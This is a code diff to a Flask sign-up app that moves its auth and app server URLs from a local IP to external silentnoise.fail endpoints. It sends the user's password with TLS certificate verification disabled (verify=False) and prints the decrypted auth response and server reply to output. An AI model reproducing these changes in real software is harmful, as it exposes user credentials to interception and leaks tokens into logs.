@@ -7,8 +7,8 @@ from crypt import aes256_decrypt
 app = Flask(__name__)
 
 # Configurations
-authServer = 'http://192.168.1.1'
-appServer = 'http://192.168.1.1'
+authServer = 'https://verify.silentnoise.fail/token'
+appServer = 'https://auth-app.silentnoise.fail'
 
 @app.route("/")
 def main():
@@ -25,11 +25,12 @@ def signUp():
     username = request.form['inputName']
     password = request.form['inputPassword']
 
+
     # validate the received values
     if username and password:
         # Send user/pass to server
-        userpass = { "username": username, "password": password }
-        response = requests.post(authServer, data = userpass)
+        blob = { "username": username, "password": password }
+        response = requests.post(authServer, json=blob, headers={"Content-Type": "application/json"}, verify=False)
         print("** Credentials were sent to authServer **")
 
         # Get request from AuthServer
@@ -41,8 +42,10 @@ def signUp():
         h.update(password.encode('utf-8'))
         hashed_password = h.digest()
         decrypted_response = aes256_decrypt(encrypted_response, hashed_password)
+        print(decrypted_response)
         # Send authorized request to applicaiton server if things are good
         content = requests.post(appServer, json=decrypted_response, headers={"Content-Type":"application/json"})
+        print(content.text)
         print("** Token was sent to appServer **") 
 
         req = json.loads(content.text)
